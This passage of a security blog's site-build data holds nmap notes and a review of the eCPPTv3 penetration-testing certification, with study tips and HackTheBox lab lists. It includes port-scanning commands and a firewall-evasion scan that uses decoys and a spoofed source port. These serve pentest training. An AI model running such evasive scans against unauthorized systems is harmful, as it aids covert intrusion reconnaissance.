474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Then do\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:25ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">extractPorts\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;ports\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">file>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch3 id=\"serviceversion-scan-on-open-ports\">Service/Version scan on open ports\u003Ca class=\"anchor\" href=\"#serviceversion-scan-on-open-ports\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:28ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p&#x3C;ports>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sCV\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;IP>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003C/section>\u003Csection>\u003Ch2 id=\"firewall-evasion\">Firewall Evasion\u003Ca class=\"anchor\" href=\"#firewall-evasion\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:79ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">sudo\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sCV\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-n\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">&#x3C;IP>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--disable-arp-ping\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--source-port\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">53\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-D\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RND:2\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003C/section>",{"headings":116,"localImagePaths":144,"remoteImagePaths":145,"frontmatter":146,"imagePaths":151},[117,119,122,126,129,132,135,138,141],{"depth":22,"slug":98,"text":118},"Nmap#",{"depth":58,"slug":120,"text":121},"multiple-target","Multiple Target#",{"depth":123,"slug":124,"text":125},3,"host-discovery","Host Discovery#",{"depth":123,"slug":127,"text":128},"port-scan","Port Scan#",{"depth":58,"slug":130,"text":131},"single-target-scan","Single Target scan#",{"depth":123,"slug":133,"text":134},"tcp-port-scan","TCP Port Scan#",{"depth":123,"slug":136,"text":137},"parse-open-ports","Parse open ports#",{"depth":123,"slug":139,"text":140},"serviceversion-scan-on-open-ports","Service/Version scan on open ports#",{"depth":58,"slug":142,"text":143},"firewall-evasion","Firewall Evasion#",[],[],{"title":101,"published":147,"description":103,"image":104,"tags":148,"category":106,"draft":39,"minutes":22,"words":149,"excerpt":150},["Date","2025-07-16T00:00:00.000Z"],[106,107,108,77,109],198,"Initial Host Discovery",[],"nmap.md","ecppt",{"id":153,"data":155,"body":164,"filePath":165,"digest":166,"rendered":167,"legacyId":230},{"title":156,"published":157,"draft":39,"description":158,"image":159,"tags":160,"category":163,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"eCPPT - Review",["Date","2025-09-06T00:00:00.000Z"],"Here I share my overall opinion on the eCPPTv3 Certification by INE, some Tips & Tricks and some machines & material to actually prepare for the certification","https://www.approach-cyber.com/wp-content/uploads/2025/01/30.webp",[43,161,162],"INE","eCPPT","Certification","## eCPPTv3 Review\n\n**January 2025 • by DelorianCS**\n\nMy hands-on experience with *INE's *Certified Professional Penetration Tester* `eCPPTv3`: what the training covers and misses (yeah, it misses a lot), how the exam feels, and practical tips to pass on your first go.\n\n\n## My Background\nI was pretty much a beginner; my only cert was `eJPTv2`. I prepared mostly with **HTB Academy** and retired labs focused on *Active Directory* and basic *web pentesting*. I also had a bit of *TryHackMe* for the fundamentals.\n\n## The Training\nThe official *INE* content helps, but it's not fully aligned with the exam's path. Combine it with hands-on *Active Directory*, *password attacks*, and a few web labs to close the gaps.\n\n### What to Skip on the Training\n- *Client-Side Attacks* (rarely relevant for the attempt)\n- *Intro x86/BOF* (great skills, low direct payoff here)\n- *Full C2 sections* (nice to know; not strictly required)\n\n**These are still valuable—circle back post-exam.**\n\n## What to Add (to actually pass)\n\n### Active Directory\n- **HTB Academy**: Intro to AD; AD Enumeration & Attacks (I'll be sharing this later on)\n- **Impacket fluency** (`secretsdump`, `wmiexec`, `GetUserSPNs`, etc.)\n- **PowerView** basics & common AD misconfigs\n\n### Web App\n- Practice *WordPress* + common vulns (auth bypass, `LFI/RFI`, `SSRF`, `upload bypass`)\n- Even though this may not probably be in you're exam, it's still good to know them\n- Web portion is lighter—don't over-index on it\n\n## Preparation\nIf you just passed `eJPTv2`, 20–40 days of focused practice is enough. Do the Machines & Modules listed here, take notes, and you'll be in great shape.\n\n## The Exam\nThe exam runs in-browser via `Guacamole`, which can feel a bit odd if you're used to your own **VM**. Some tools live in containers and may have different names (e.g. `evil-winrm`). You get 24 hours—plenty to finish if you plan well.\n\n## Personal Opinion\nPersonally I found this exam not rewarding at all as it's mostly done by *brute-forcing* **EVERYTHING**, if you're planning to buy this certification please don't, there are way better *Active Directory* broad certifications like `CRTP` \n\n## Exam Flaws / Caveats\n1. Lab instability (dynamic flags sometimes missing until reset)\n2. Provided cracking lists may mislead—bring your staples\n3. Some tools not on the jump box—have backups ready\n4. Expect some brute-forcing; AD is there but not the only path\n5. Occasional misworded tasks (e.g., a user that doesn't exist)\n\n## Tips\n- Take meticulous notes—hosts, creds, footholds, privesc ideas\n- Use only: `xato-net-10k`, `seasons`, `months`, `rockyou`\n- Paste all questions into your notes (Obsidian is great)\n- If stuck, brute-force the \"low-hanging fruit\" angles\n- Don't forget to have fun (trust me)\n\n---\n\n## Machines & Modules by HackTheBox\n\n### Linux Boxes\n```\n1. CozyHosting\n2. Keeper\n3. Jerry\n4. Love\n5. Trick\n6. Spectra\n7. Backdoor\n8. Blocky\n```\n### AD Boxes\n```\n1. Active\n2. Forest\n3. Sauna\n4. Monteverde\n5. Cascade\n6. Cicada\n7. Resolute\n```\n### HTB Academy Modules\n- [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)\n- [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)\n- [Intro to Active Directory](https://academy.hackthebox.com/module/details/74)\n- [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)\n- [Hacking WordPress](https://academy.hackthebox.com/module/details/17)\n\n### Quick Facts\n- **Style**: Brute-Force is a must, AD-heavy\n- **Time**: one-day exam window\n- **Focus**: enumeration → chaining → privesc\n\n---","src/content/posts/ecppt.md","0b73f2f7b9248adc",{"html":168,"metadata":169},"\u003Csection>\u003Ch2 id=\"ecpptv3-review\">eCPPTv3 Review\u003Ca class=\"anchor\" href=\"#ecpptv3-review\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>\u003Cstrong>January 2025 • by DelorianCS\u003C/strong>\u003C/p>\u003Cp>My hands-on experience with *INE’s \u003Cem>Certified Professional Penetration Tester\u003C/em> \u003Ccode>eCPPTv3\u003C/code>: what the training covers and misses (yeah, it misses a lot), how the exam feels, and practical tips to pass on your first go.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"my-background\">My Background\u003Ca class=\"anchor\" href=\"#my-background\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>I was pretty much a beginner; my only cert was \u003Ccode>eJPTv2\u003C/code>. I prepared mostly with \u003Cstrong>HTB Academy\u003C/strong> and retired labs focused on \u003Cem>Active Directory\u003C/em> and basic \u003Cem>web pentesting\u003C/em>. I also had a bit of \u003Cem>TryHackMe\u003C/em> for the fundamentals.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"the-training\">The Training\u003Ca class=\"anchor\" href=\"#the-training\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>The official \u003Cem>INE\u003C/em> content helps, but it’s not fully aligned with the exam’s path. Combine it with hands-on \u003Cem>Active Directory\u003C/em>, \u003Cem>password attacks\u003C/em>, and a few web labs to close the gaps.\u003C/p>\u003Csection>\u003Ch3 id=\"what-to-skip-on-the-training\">What to Skip on the Training\u003Ca class=\"anchor\" href=\"#what-to-skip-on-the-training\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Cem>Client-Side Attacks\u003C/em> (rarely relevant for the attempt)\u003C/li>\n\u003Cli>\u003Cem>Intro x86/BOF\u003C/em> (great skills, low direct payoff here)\u003C/li>\n\u003Cli>\u003Cem>Full C2 sections\u003C/em> (nice to know; not strictly required)\u003C/li>\n\u003C/ul>\u003Cp>\u003Cstrong>These are still valuable—circle back post-exam.\u003C/strong>\u003C/p>\u003C/section>\u003C/section>\n\u003Csection>\u003Ch2 id=\"what-to-add-to-actually-pass\">What to Add (to actually pass)\u003Ca class=\"anchor\" href=\"#what-to-add-to-actually-pass\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Csection>\u003Ch3 id=\"active-directory\">Active Directory\u003Ca class=\"anchor\" href=\"#active-directory\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Cstrong>HTB Academy\u003C/strong>: Intro to AD; AD Enumeration &#x26; Attacks (I’ll be sharing this later on)\u003C/li>\n\u003Cli>\u003Cstrong>Impacket fluency\u003C/strong> (\u003Ccode>secretsdump\u003C/code>, \u003Ccode>wmiexec\u003C/code>, \u003Ccode>GetUserSPNs\u003C/code>, etc.)\u003C/li>\n\u003Cli>\u003Cstrong>PowerView\u003C/strong> basics &#x26; common AD misconfigs\u003C/li>\n\u003C/ul>\u003C/section>\u003Csection>\u003Ch3 id=\"web-app\">Web App\u003Ca class=\"anchor\" href=\"#web-app\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>Practice \u003Cem>WordPress\u003C/em> + common vulns (auth bypass, \u003Ccode>LFI/RFI\u003C/code>, \u003Ccode>SSRF\u003C/code>, \u003Ccode>upload bypass\u003C/code>)\u003C/li>\n\u003Cli>Even though this may not probably be in you’re exam, it’s still good to know them\u003C/li>\n\u003Cli>Web portion is lighter—don’t over-index on it\u003C/li>\n\u003C/ul>\u003C/section>\u003C/section>\n\u003Csection>\u003Ch2 id=\"preparation\">Preparation\u003Ca class=\"anchor\" href=\"#preparation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>If you just passed \u003Ccode>eJPTv2\u003C/code>, 20–40 days of focused practice is enough. Do the Machines &#x26; Modules listed here, take notes, and you’ll be in great shape.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"the-exam\">The Exam\u003Ca class=\"anchor\" href=\"#the-exam\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>The exam runs in-browser via \u003Ccode>Guacamole\u003C/code>, which can feel a bit odd if you’re used to your own \u003Cstrong>VM\u003C/strong>. Some tools live in containers and may have different names (e.g. \u003Ccode>evil-winrm\u003C/code>). You get 24 hours—plenty to finish if you plan well.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"personal-opinion\">Personal Opinion\u003Ca class=\"anchor\" href=\"#personal-opinion\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>Personally I found this exam not rewarding at all as it’s mostly done by \u003Cem>brute-forcing\u003C/em> \u003Cstrong>EVERYTHING\u003C/strong>, if you’re planning to buy this certification please don’t, there are way better \u003Cem>Active Directory\u003C/em> broad certifications like \u003Ccode>CRTP\u003C/code>\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"exam-flaws--caveats\">Exam Flaws / Caveats\u003Ca class=\"anchor\" href=\"#exam-flaws--caveats\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Col>\n\u003Cli>Lab instability (dynamic flags sometimes missing until reset)\u003C/li>\n\u003Cli>Provided cracking lists may mislead—bring your staples\u003C/li>\n\u003Cli>Some tools not on the jump box—have backups ready\u003C/li>\n\u003Cli>Expect some brute-forcing; AD is there but not the only path\u003C/li>\n\u003Cli>Occasional misworded tasks (e.g., a user that doesn’t exist)\u003C/li>\n\u003C/ol>\u003C/section>\n\u003Csection>\u003Ch2 id=\"tips\">Tips\u003Ca class=\"anchor\" href=\"#tips\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cul>\n\u003Cli>Take meticulous notes—hosts, creds, footholds, privesc ideas\u003C/li>\n\u003Cli>Use only: \u003Ccode>xato-net-10k\u003C/code>, \u003Ccode>seasons\u003C/code>, \u003Ccode>months\u003C/code>, \u003Ccode>rockyou\u003C/code>\u003C/li>\n\u003Cli>Paste all questions into your notes (Obsidian is great)\u003C/li>\n\u003Cli>If stuck, brute-force the “low-hanging fruit” angles\u003C/li>\n\u003Cli>Don’t forget to have fun (trust me)\u003C/li>\n\u003C/ul>\u003Chr>\u003C/section>\n\u003Csection>\u003Ch2 id=\"machines--modules-by-hackthebox\">Machines &#x26; Modules by HackTheBox\u003Ca class=\"anchor\" href=\"#machines--modules-by-hackthebox\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Csection>\u003Ch3 id=\"linux-boxes\">Linux Boxes\u003Ca class=\"anchor\" href=\"#linux-boxes\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:14ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">1. CozyHosting\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">2. Keeper\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">3. Jerry\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">4. Love\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">5. Trick\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">6. Spectra\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">7. Backdoor\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">8. Blocky\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch3 id=\"ad-boxes\">AD Boxes\u003Ca class=\"anchor\" href=\"#ad-boxes\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:13ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">1. Active\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">2. Forest\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">3. Sauna\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">4. Monteverde\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv 